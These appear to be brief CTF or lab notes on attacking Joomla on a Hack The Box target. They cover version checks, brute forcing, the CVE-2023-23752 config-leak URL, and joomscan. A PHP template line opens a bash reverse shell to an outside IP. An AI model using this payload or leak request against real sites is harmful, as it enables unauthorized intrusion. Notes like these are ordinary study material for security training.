## Joomla


get Version

Hacktricks infos: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

Brute Force password: (did work this try)
https://github.com/ajnik/joomla-bruteforce

### CVE-2023-23752: 
Infos and explanation https://vulncheck.com/blog/joomla-for-rce

Example Test Link: http://dev.devvortex.htb/api/index.php/v1/config/application?public=true


```shell
This in php template to connect with netcat:

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.190/8001 0>&1'")

```

### JoomScan
So now we will use joomscan tool. JoomScan is a tool designed for penetration testing of Joomla CMS websites. By default this tool already come pre-installed in the system. To run the joomscan we have to be in that directory where joomscan is.

perl joomscan.pl -u http://dev.devvortex.htb